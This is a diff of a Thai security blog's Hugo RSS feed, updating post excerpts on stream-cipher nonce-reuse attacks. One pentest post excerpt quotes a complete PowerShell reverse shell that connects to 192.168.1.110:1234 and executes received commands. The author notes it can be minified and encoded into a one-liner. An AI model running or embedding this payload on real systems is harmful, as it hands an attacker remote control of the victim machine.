@@ -6,7 +6,11 @@
     <description>Recent content in Posts on SUAM</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en</language>
-    <lastBuildDate>Wed, 20 Jan 2021 00:00:00 +0000</lastBuildDate><atom:link href="https://suam.wtf/posts/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Wed, 20 Jan 2021 00:00:00 +0000</lastBuildDate>
+    
+	<atom:link href="https://suam.wtf/posts/index.xml" rel="self" type="application/rss+xml" />
+    
+    
     <item>
       <title>React Native Application Static Analysis [English]</title>
       <link>https://suam.wtf/posts/react-native-application-static-analysis-en/</link>
@@ -48,9 +52,9 @@ For each framework, different reverse engineering and static analysis methods ar
       <pubDate>Thu, 03 Dec 2020 00:00:00 +0000</pubDate>
       
       <guid>https://suam.wtf/posts/nonce-reuse-attack-on-stream-cipher/</guid>
-      <description>ช่วงนี้ Trend การใช้งาน Stream cipher กำลังมาแรงมาก เนื่องจากความเร็วในการเข้ารหัสและความง่ายของตัว Algorithm อย่าง TLS 1.3 ก็หันมาใช้งาน Stream cipher เป็นหลักแล้ว เช่น AES-GCM และ ChaCha20
-อย่างไรก็ตามการใช้งาน Stream cipher มันจะมีข้อหนึ่งที่ต้องระวังมาก ๆ ๆ ๆ ๆ คือการใช้คู่ Nonce และ Key ซ้ำ ในการเข้ารหัสมากกว่า 1 รอบ (โครตบาป) จะเห็นได้จากช่องโหว่ ดัง ๆ มากมายที่ Impact เกิดจากการใช้งาน Nonce ซ้ำ เช่น KRACK Attacks บน WPA2 หรือ Forbidden Attack บน TLS
-Stream Cipher คือ ? ก่อนที่จะมาดูการโจมตี เรามาทำความรู้จักกับ Stream cipher กันก่อน ตัว Stream cipher จะเป็นการเข้ารหัสแบบ Symmetric key cipher แบบหนึ่ง คือ การเข้ารหัส และถอดรหัสจะใช้ Key เดียวกัน</description>
+      <description>สำหรับ Part อื่น ๆ
+ Crypto: เรื่อง Nonce ๆ ของ Stream Cipher Part 1 (Part ปัจจุบัน) Crypto: เรื่อง Nonce ๆ ของ Stream Cipher Part 2 Crypto: เรื่อง Nonce ๆ ของ Stream Cipher Part 3 (Coming soon)  ช่วงนี้ Trend การใช้งาน Stream cipher กำลังมาแรงมาก เนื่องจากความเร็วในการเข้ารหัสและความง่ายของตัว Algorithm อย่าง TLS 1.3 ก็หันมาใช้งาน Stream cipher เป็นหลักแล้ว เช่น AES-GCM และ ChaCha20
+อย่างไรก็ตามการใช้งาน Stream cipher มันจะมีข้อหนึ่งที่ต้องระวังมาก ๆ ๆ ๆ ๆ คือการใช้คู่ Nonce และ Key ซ้ำ ในการเข้ารหัสมากกว่า 1 รอบ (โครตบาป) จะเห็นได้จากช่องโหว่ ดัง ๆ มากมายที่ Impact เกิดจากการใช้งาน Nonce ซ้ำ เช่น KRACK Attacks บน WPA2 หรือ Forbidden Attack บน TLS</description>
     </item>
     
     <item>
@@ -115,6 +119,16 @@ Myth#1: ถ้าทำตาม PDPA แล้วระบบของเรา
       <description>เรื่องของเรื่องคือ ผมพยายามหา Powershell Script สั้น ๆ ที่ใช้สำหรับทำ Reverse Shell มาใช้สำหรับทำ Pentest ผมไปเจอตัวหนึ่งของคุณ @nikhil_mitt โดยมีหน้าตาประมาณนี้ครับ
 $client = New-Object System.Net.Sockets.TCPClient(&amp;quot;192.168.1.110&amp;quot;,1234); $stream = $client.GetStream();[byte[]]$bytes = 0..255|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){ $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2&amp;gt;&amp;amp;1 | Out-String ); $sendback2 = $sendback + &amp;quot;PS &amp;quot; + (pwd).Path + &amp;quot;&amp;gt; &amp;quot;; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush(); }; $client.Close();  เต็ม ๆ อ่านที่ Link นี้นะครับ
 ผมชอบมากเลยครับเพราะว่าหลังจากเอาไป Minify, Encode และทำเป็น One Line แล้วมันสั้นดี จะได้ประมาณนี้ครับ</description>
+    </item>
+    
+    <item>
+      <title>Crypto: เรื่อง Nonce ๆ ของ Stream Cipher Part 2</title>
+      <link>https://suam.wtf/posts/nonce-reuse-attack-on-stream-cipher-2/</link>
+      <pubDate>Mon, 10 Feb 2020 00:00:00 +0000</pubDate>
+      
+      <guid>https://suam.wtf/posts/nonce-reuse-attack-on-stream-cipher-2/</guid>
+      <description>สำหรับ Part อื่น ๆ
+ Crypto: เรื่อง Nonce ๆ ของ Stream Cipher Part 1 Crypto: เรื่อง Nonce ๆ ของ Stream Cipher Part 2 (Part ปัจจุบัน) Crypto: เรื่อง Nonce ๆ ของ Stream Cipher Part 3 (Coming soon)  จาก Part ที่แล้วได้ฝาก Lab ไว้ให้ลองทำ GCM Nonce Reuse Lab ถ้าใครลองอ่านหรือศึกษามาแล้ว จะเจอว่า GCM Mode ทุกอย่างจะเหมือนกับ CTR Mode เลย ต่างกันแค่เพิ่ม Authentication Tag เข้ามา ดังนั้นการ Solve ข้อนี้จะทำเหมือนกับ Lab CTR Static Nonce Lab เลยครับ ขอไม่เฉลยละกันเพราะมันจะเหมือนกับหัวข้อ Known-plaintext Attack on Stream Cipher ในบทความ Part ที่ 1</description>
     </item>
     
     <item>
